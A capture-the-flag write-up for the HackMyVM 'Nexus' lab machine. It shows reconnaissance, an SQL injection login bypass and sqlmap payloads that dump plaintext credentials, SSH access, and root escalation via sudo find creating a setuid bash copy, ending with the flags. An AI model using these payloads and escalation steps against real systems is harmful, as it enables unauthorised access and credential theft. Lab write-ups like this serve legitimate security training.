# Nexus

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.41:22
Open 10.0.2.41:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.41

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 48:42:7a:cf:38:19:20:86:ea:fd:50:88:b8:64:36:46 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNisH88omWEmamx1HuZpPoFTndSD5v4+IJIYYDOFKUnOjdCGeEw4ovGjRvjUWst9Ru5o1FgknmUYU9H1FA2/wwg=
|   256 9d:3d:85:29:8d:b0:77:d8:52:c2:81:bb:e9:54:d4:21 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJEbI0M6PcaMWGl0AV0pd1nGMxU54TWqnf362HOXpBJK
80/tcp open  http    syn-ack Apache httpd 2.4.62 ((Debian))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP 

Webapp is serving only CSS

![writeup.png](/assets/pentest/hackmyvm/nexus/writeup.png)

```bash
└─$ feroxbuster -u http://nexus.hmv/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,403,500 --dont-scan js,css,png,jpeg,jpg,gif -n -x .php,.txt,.html
200      GET       47l       86w      825c http://nexus.hmv/
200      GET       47l       86w      825c http://nexus.hmv/index.html
200      GET     1641l     5430w    75134c http://nexus.hmv/index2.php
200      GET       26l       36w      352c http://nexus.hmv/login.php
200      GET       62l      117w     1309c http://nexus.hmv/auth-login.php
```

### Fancy HTML

```bash
└─$ curl http://nexus.hmv/index2.php | html2markdown
### OUTPUT

48 6f 6c 61 20 41 6c 69 74 61 2c 20 65 73 70 65 72 6f 20 71 75 65 20 65 73 74
65 73 20 6c 65 79 65 6e 64 6f 20 65 73 74 65 20 6d 65 6e 73 61 6a 65 20 63 6f
64 69 66 69 63 61 64 6f 2c 20 70 61 72 61 20 70 6f 64 65 72 20 68 61 63 6b 65
61 72 20 65 6c 20 73 69 73 74 65 6d 61 20 74 69 65 6e 65 73 20 71 75 65 20 61
70 6c 69 63 61 72 20 6c 61 20 74 e9 63 6e 69 63 61 20 71 75 65 20 74 65 20 65
78 70 6c 69 71 75 e9 2c 20 74 65 20 68 65 20 64 65 6a 61 64 6f 20 65 6c 20 61
63 63 65 73 6f 20 63 6f 6e 20 6c 61 20 63 6c 61 76 65 20 65 76 61 6c 20 22 70
61 6e 64 6f 72 61 22 2e 20 4e 6f 73 20 76 65 6d 6f 73 20 65 6e 20 6c 61 20 72
65 64 2e
...
  * NEXUS MSG> _ AUTHORIZATION PANEL :: http://[personal ip]/auth-login.php
```

```bash
└─$ curl http://nexus.hmv/index2.php  -s | html2markdown | grep -P '^\w\w \w\w \w\w' | xxd -r -p | trans -b :en
Hi Alita, I hope you are reading this coded message, to be able to hack the system you have to apply the technique that explained you, I have left you access with the evaluation key "Pandora". See you on the network.
```

The potential credentials don't work
```bash
└─$ curl http://nexus.hmv/login.php -d 'user=Alita&pass=Pandora' -s | html2markdown
    Acceso denegado.
└─$ curl http://nexus.hmv/login.php -d 'user=alita&pass=Pandora' -s | html2markdown
    Acceso denegado.
```

### SQLi

```bash
└─$ curl http://nexus.hmv/login.php -d "user='&pass=Pandora" -s | html2markdown

**Fatal error** : Uncaught mysqli_sql_exception: You have an error in your SQL
syntax; check the manual that corresponds to your MariaDB server version for
the right syntax to use near 'Pandora'' at line 1 in
/var/www/html/login.php:22 Stack trace: #0 /var/www/html/login.php(22):
mysqli->query() #1 {main} thrown in **/var/www/html/login.php** on line **22**

└─$ curl http://nexus.hmv/login.php -d "user='+OR+true+--+-&pass=Pandora" -s | html2markdown | trans -b :en
Access granted. Welcome, 'or True - -.
```

Find injection
```bash
└─$ sqlmap -u http://nexus.hmv/login.php --data "user=FUZZ&pass=Pandora" -p user --batch --dbms=MySQL --current-db
---
Parameter: user (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: user=FUZZ' OR NOT 8760=8760#&pass=Pandora

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: user=FUZZ' AND (SELECT 8247 FROM(SELECT COUNT(*),CONCAT(0x7176717871,(SELECT (ELT(8247=8247,1))),0x716b627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IPrr&pass=Pandora

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=FUZZ' AND (SELECT 7891 FROM (SELECT(SLEEP(5)))aZDh)-- hVFW&pass=Pandora
---
[08:08:35] [INFO] retrieved: 'sion'
current database: 'sion'
```

Tables
```bash
└─$ sqlmap -u http://nexus.hmv/login.php --data "user=FUZZ&pass=Pandora" -p user --batch --dbms=MySQL -D sion --tables
[08:10:45] [INFO] retrieved: 'users'
Database: sion
[1 table]
+-------+
| users |
+-------+
```

Dump 
```bash
└─$ sqlmap -u http://nexus.hmv/login.php --data "user=FUZZ&pass=Pandora" -p user --batch --dbms=MySQL -D sion -T users --dump
Database: sion
Table: users
[2 entries]
+----+--------------------+----------+
| id | password           | username |
+----+--------------------+----------+
| 1  | F4ckTh3F4k3H4ck3r5 | shelly   |
| 2  | cambiame08         | admin    |
+----+--------------------+----------+
```

## SSH (shelly)

```bash
└─$ sshpass -p 'F4ckTh3F4k3H4ck3r5' ssh shelly@nexus.hmv
shelly@NexusLabCTF:~$ id
uid=1000(shelly) gid=1000(shelly) grupos=1000(shelly),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

### User.txt

```bash
shelly@NexusLabCTF:~$ grep Flag ./SA/user-flag.txt
Flag User ::  82kd8FJ5SJ00HMVUS3R36gd
```

## Privilege Escalation

```bash
shelly@NexusLabCTF:~$ sudo -l
sudo: unable to resolve host NexusLabCTF: Nombre o servicio desconocido
Matching Defaults entries for shelly on NexusLabCTF:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD, use_pty

User shelly may run the following commands on NexusLabCTF:
    (ALL) NOPASSWD: /usr/bin/find
```

```bash
shelly@NexusLabCTF:~$ sudo find ./SA/ -type f -exec sh -c 'install -m4777 /bin/bash /tmp/rootbash' \;
shelly@NexusLabCTF:~$ /tmp/rootbash -p
rootbash-5.2# id
uid=1000(shelly) gid=1000(shelly) euid=0(root) grupos=1000(shelly),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

```bash
rootbash-5.2# install /root/Sion-Code/use-fim-to-root.png /tmp/root.png -m777
---
└─$ sshpass -p 'F4ckTh3F4k3H4ck3r5' scp shelly@nexus.hmv:/tmp/root.png .
```

![writeup-1.png](/assets/pentest/hackmyvm/nexus/writeup-1.png)

### Root.txt

Flag was inside the image 
```bash
rootbash-5.2# strings /root/Sion-Code/use-fim-to-root.png | grep flag -in
896:;HMV-FLAG[[ p3vhKP9d97a7HMV79ad9ks2s9 ]]
```